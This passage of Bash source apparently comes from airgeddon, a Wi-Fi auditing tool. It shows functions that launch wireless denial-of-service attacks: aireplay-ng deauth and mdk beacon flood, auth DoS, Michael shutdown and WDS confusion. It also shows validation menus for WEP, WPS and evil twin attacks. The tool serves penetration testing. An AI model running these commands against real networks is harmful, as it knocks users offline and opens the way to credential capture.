		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
		wait_for_process "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
	fi
}

#Execute aireplay DoS attack
function exec_aireplaydeauth() {

	debug_print

	echo
	language_strings "${language}" 90 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
		pid_control_pursuit_mode "aireplay deauth attack"
	else
		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1

		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
	fi
}

#Execute WDS confusion DoS attack
function exec_wdsconfusion() {

	debug_print

	echo
	language_strings "${language}" 91 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
		pid_control_pursuit_mode "wids / wips / wds confusion attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
		wait_for_process "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
	fi
}

#Execute Beacon flood DoS attack
function exec_beaconflood() {

	debug_print

	echo
	language_strings "${language}" 92 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
		pid_control_pursuit_mode "beacon flood attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
	fi
}

#Execute Auth DoS attack
function exec_authdos() {

	debug_print

	echo
	language_strings "${language}" 93 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
		pid_control_pursuit_mode "auth dos attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack" "active"
		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
	fi
}

#Execute Michael Shutdown DoS attack
function exec_michaelshutdown() {

	debug_print

	echo
	language_strings "${language}" 94 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
		pid_control_pursuit_mode "michael shutdown attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
	fi
}

#Validate mdk parameters
function mdk_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 95 "title"
	language_strings "${language}" 35 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_mdkdeauth
}

#Switch mdk version
function mdk_version_toggle() {

	debug_print

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk3):\1=mdk4:" "${rc_path}" 2> /dev/null
		AIRGEDDON_MDK_VERSION="mdk4"
	else
		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk4):\1=mdk3:" "${rc_path}" 2> /dev/null
		AIRGEDDON_MDK_VERSION="mdk3"
	fi

	set_mdk_version
}

#Set mdk to selected version validating its existence
function set_mdk_version() {

	debug_print

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		if ! hash mdk3 2> /dev/null; then
			echo
			language_strings "${language}" 636 "red"
			exit_code=1
			exit_script_option
		else
			mdk_command="mdk3"
		fi
	else
		mdk_command="mdk4"
	fi
}

#Validate Aireplay parameters
function aireplay_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 96 "title"
	language_strings "${language}" 36 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_aireplaydeauth
}

#Validate WDS confusion parameters
function wds_confusion_option() {

	debug_print

	echo
	language_strings "${language}" 97 "title"
	language_strings "${language}" 37 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
		echo
		language_strings "${language}" 508 "yellow"
		language_strings "${language}" 115 "read"

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_wdsconfusion
}

#Validate Beacon flood parameters
function beacon_flood_option() {

	debug_print

	echo
	language_strings "${language}" 98 "title"
	language_strings "${language}" 38 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi

	if ! ask_channel; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_beaconflood
}

#Validate Auth DoS parameters
function auth_dos_option() {

	debug_print

	echo
	language_strings "${language}" 99 "title"
	language_strings "${language}" 39 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
		echo
		language_strings "${language}" 508 "yellow"
		language_strings "${language}" 115 "read"

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_authdos
}

#Validate Michael Shutdown parameters
function michael_shutdown_option() {

	debug_print

	echo
	language_strings "${language}" 100 "title"
	language_strings "${language}" 40 "green"

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if select_secondary_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	exec_michaelshutdown
}

#Validate wep all-in-one and besside-ng attacks parameters
function wep_attack_option() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WEP"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! validate_network_encryption_type "WEP"; then
		return 1
	fi

	echo
	language_strings "${language}" 425 "yellow"
	language_strings "${language}" 115 "read"

	manage_wep_log
	language_strings "${language}" 115 "read"

	if [ "${1}" = "allinone" ]; then
		exec_wep_allinone_attack
	else
		exec_wep_besside_attack
	fi
}

#Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
function wps_attacks_parameters() {

	debug_print

	if [ "${1}" != "no_monitor_check" ]; then
		if ! check_monitor_enabled "${interface}"; then
			echo
			language_strings "${language}" 14 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi

		echo
		language_strings "${language}" 34 "yellow"
	fi

	if ! ask_bssid "wps"; then
		return 1
	fi

	if ! ask_channel "wps"; then
		return 1
	fi

	if [ "${1}" != "no_monitor_check" ]; then
		case ${wps_attack} in
			"custompin_bully"|"custompin_reaver")
				ask_custom_pin
				ask_timeout "wps_standard"
			;;
			"pixiedust_bully"|"pixiedust_reaver")
				ask_timeout "wps_pixiedust"
			;;
			"pindb_bully"|"pindb_reaver")
				ask_timeout "wps_standard"
			;;
			"nullpin_reaver")
				ask_timeout "wps_standard"
			;;
		esac
	fi

	return 0
}

#Print selected options
function print_options() {

	debug_print

	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		language_strings "${language}" 451 "blue"
	else
		language_strings "${language}" 452 "blue"
	fi

	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
		language_strings "${language}" 567 "blue"
	else
		language_strings "${language}" 568 "blue"
	fi

	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
		language_strings "${language}" 563 "blue"
	else
		language_strings "${language}" 564 "blue"
	fi

	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		language_strings "${language}" 453 "blue"
	else
		language_strings "${language}" 454 "blue"
	fi

	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		language_strings "${language}" 474 "blue"
	else
		language_strings "${language}" 475 "blue"
	fi

	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
		language_strings "${language}" 575 "blue"
	else
		language_strings "${language}" 576 "blue"
	fi

	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		language_strings "${language}" 582 "blue"
	else
		language_strings "${language}" 583 "blue"
	fi

	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
		language_strings "${language}" 594 "blue"
	else
		language_strings "${language}" 595 "blue"
	fi

	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		language_strings "${language}" 690 "blue"
	else
		language_strings "${language}" 691 "blue"
	fi

	reboot_required_text=""
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		if grep -q "AIRGEDDON_WINDOWS_HANDLING=tmux" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 618 "blue"
	else
		if grep -q "AIRGEDDON_WINDOWS_HANDLING=xterm" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 619 "blue"
	fi

	language_strings "${language}" 641 "blue"

	reboot_required_text=""
	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		if grep -q "AIRGEDDON_PLUGINS_ENABLED=false" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 653 "blue"
	else
		if grep -q "AIRGEDDON_PLUGINS_ENABLED=true" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 654 "blue"
	fi
}

#Print selected interface
function print_iface_selected() {

	debug_print

	if [ -z "${interface}" ]; then
		language_strings "${language}" 41 "red"
		echo
		language_strings "${language}" 115 "read"
		select_interface
	else
		check_interface_mode "${interface}"
		if [ "${ifacemode}" = "(Non wifi card)" ]; then
			language_strings "${language}" 42 "blue"
		else
			language_strings "${language}" 514 "blue"
		fi
	fi
}

#Print selected internet interface
function print_iface_internet_selected() {

	debug_print

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ -z "${internet_interface}" ]; then
			language_strings "${language}" 283 "blue"
		else
			language_strings "${language}" 282 "blue"
		fi
	fi
}

#Print selected target parameters (bssid, channel, essid and type of encryption) for dos attacks menu
function print_all_target_dos_attacks_menu_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	else
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	fi
}

#Print selected target parameters (bssid, channel, essid and type of encryption)
function print_all_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	fi
}

#Print selected target parameters on evil twin menu (bssid, channel and essid)
function print_all_target_vars_et() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi
}

#Print selected target parameters on evil twin submenus (bssid, channel, essid, DoS type and Handshake file)
function print_et_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi

	if [ "${current_menu}" != "et_dos_menu" ]; then
		if [ -n "${et_dos_attack}" ]; then
			language_strings "${language}" 272 "blue"
		else
			language_strings "${language}" 278 "blue"
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ -n "${et_handshake}" ]; then
			language_strings "${language}" 311 "blue"
		else
			if [ -n "${enteredpath}" ]; then
				language_strings "${language}" 314 "blue"
			else
				language_strings "${language}" 310 "blue"
			fi
		fi
	fi
}

#Print selected target parameters on wps attacks menu (bssid, channel and essid)
function print_all_target_vars_wps() {

	debug_print

	if [ -n "${wps_bssid}" ]; then
		language_strings "${language}" 335 "blue"
	else
		language_strings "${language}" 339 "blue"
	fi

	if [ -n "${wps_channel}" ]; then
		language_strings "${language}" 336 "blue"
	else
		language_strings "${language}" 340 "blue"
	fi

	if [ -n "${wps_essid}" ]; then
		if [ "${wps_essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 337 "blue"
		else
			language_strings "${language}" 338 "blue"
		fi
	else
		language_strings "${language}" 341 "blue"
	fi

	if [ -n "${wps_locked}" ]; then
		language_strings "${language}" 351 "blue"
	else
		language_strings "${language}" 352 "blue"
	fi
}

#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file, rules file and enterprise stuff)
function print_decrypt_vars() {

	debug_print

	if [ -n "${jtrenterpriseenteredpath}" ]; then
		language_strings "${language}" 605 "blue"
	else
		language_strings "${language}" 606 "blue"
	fi

	if [ -n "${hashcatenterpriseenteredpath}" ]; then
		language_strings "${language}" 603 "blue"
	else
		language_strings "${language}" 604 "blue"
	fi

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Print selected target parameters on personal decrypt menu (bssid, Handshake file, dictionary file and rules file)
function print_personal_decrypt_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Print selected target parameters on enterprise decrypt menu (dictionary file, rules file and hashes files)
function print_enterprise_decrypt_vars() {

	debug_print

	if [ -n "${jtrenterpriseenteredpath}" ]; then
		language_strings "${language}" 605 "blue"
	else
		language_strings "${language}" 606 "blue"
	fi

	if [ -n "${hashcatenterpriseenteredpath}" ]; then
		language_strings "${language}" 603 "blue"
	else
		language_strings "${language}" 604 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Create the dependencies arrays
function initialize_menu_options_dependencies() {

	debug_print

	clean_handshake_dependencies=("${optional_tools_names[0]}")
	aircrack_crunch_attacks_dependencies=("${optional_tools_names[1]}")
	aireplay_attack_dependencies=("${optional_tools_names[2]}")
	mdk_attack_dependencies=("${optional_tools_names[3]}")
	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}")
	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[10]}" "${optional_tools_names[11]}")
	wash_scan_dependencies=("${optional_tools_names[12]}")
	reaver_attacks_dependencies=("${optional_tools_names[13]}")
	bully_attacks_dependencies=("${optional_tools_names[14]}")
	bully_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[15]}")
	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[13]}" "${optional_tools_names[15]}")
	et_sniffing_sslstrip2_beef_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
	wep_attack_allinone_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
	wep_attack_besside_dependencies=("${optional_tools_names[27]}")
	enterprise_attack_dependencies=("${optional_tools_names[19]}" "${optional_tools_names[20]}" "${optional_tools_names[22]}")
	enterprise_identities_dependencies=("${optional_tools_names[25]}")
	asleap_attacks_dependencies=("${optional_tools_names[20]}")
	john_attacks_dependencies=("${optional_tools_names[21]}")
	johncrunch_attacks_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[1]}")
	enterprise_certificates_dependencies=("${optional_tools_names[22]}")
	pmkid_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[24]}")
}

#Set possible changes for some commands that can be found in different ways depending on the O.S.
#shellcheck disable=SC2206
function set_possible_aliases() {

	debug_print

	for item in "${!possible_alias_names[@]}"; do
		if ! hash "${item}" 2> /dev/null || [[ "${item}" = "beef" ]]; then
			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
			for item2 in "${arraliases[@]}"; do
				if hash "${item2}" 2> /dev/null; then
					optional_tools_names=(${optional_tools_names[@]/${item}/"${item2}"})
					break
				fi
			done
		fi
	done
}

#Modify dependencies arrays depending on selected options
function dependencies_modifications() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		essential_tools_names=("${essential_tools_names[@]/xterm/tmux}")
		possible_package_names[${essential_tools_names[5]}]="tmux"
		unset 'possible_package_names[xterm]'
	fi

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		optional_tools_names=("${optional_tools_names[@]/mdk4/mdk3}")
		possible_package_names[${optional_tools_names[3]}]="mdk3"
		unset 'possible_package_names[mdk4]'
	fi

	if [ "${iptables_nftables}" -eq 0 ]; then
		optional_tools_names=("${optional_tools_names[@]/nft/iptables}")
		possible_package_names[${optional_tools_names[7]}]="iptables"
		unset 'possible_package_names[nft]'
	fi
}

#Initialize optional_tools values
function initialize_optional_tools_values() {

	debug_print

	declare -gA optional_tools

	for item in "${optional_tools_names[@]}"; do
		optional_tools[${item}]=0
	done
}

#Set some vars depending on the menu and invoke the printing of target vars
function initialize_menu_and_print_selections() {

	debug_print

	forbidden_options=()

	case ${current_menu} in
		"main_menu")
			print_iface_selected
		;;
		"decrypt_menu")
			print_decrypt_vars
		;;
		"personal_decrypt_menu")
			print_personal_decrypt_vars
		;;
		"enterprise_decrypt_menu")
			print_enterprise_decrypt_vars
			enterprise_asleap_challenge=""
			enterprise_asleap_response=""
		;;
		"handshake_pmkid_decloaking_tools_menu")
			print_iface_selected
			print_all_target_vars
			return_to_handshake_pmkid_decloaking_tools_menu=0
		;;
		"dos_attacks_menu")
			enterprise_mode=""
			et_mode=""
			dos_pursuit_mode=0
			print_iface_selected
			print_all_target_dos_attacks_menu_vars
		;;
		"dos_handshake_decloak_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"language_menu")
			print_iface_selected
		;;
		"evil_twin_attacks_menu")
			return_to_et_main_menu=0
			return_to_enterprise_main_menu=0
			retry_handshake_capture=0
			return_to_et_main_menu_from_beef=0
			retrying_handshake_capture=0
			internet_interface_selected=0
			enterprise_mode=""
			et_mode=""
			et_processes=()
			secondary_wifi_interface=""
			et_attack_adapter_prerequisites_ok=0
			advanced_captive_portal=0
			print_iface_selected
			print_all_target_vars_et
		;;
		"enterprise_attacks_menu")
			return_to_enterprise_main_menu=0
			return_to_et_main_menu=0
			enterprise_mode=""
			et_mode=""
			et_processes=()
			secondary_wifi_interface=""
			et_enterprise_attack_adapter_prerequisites_ok=0
			print_iface_selected
			print_all_target_vars
		;;
		"et_dos_menu")
			dos_pursuit_mode=0
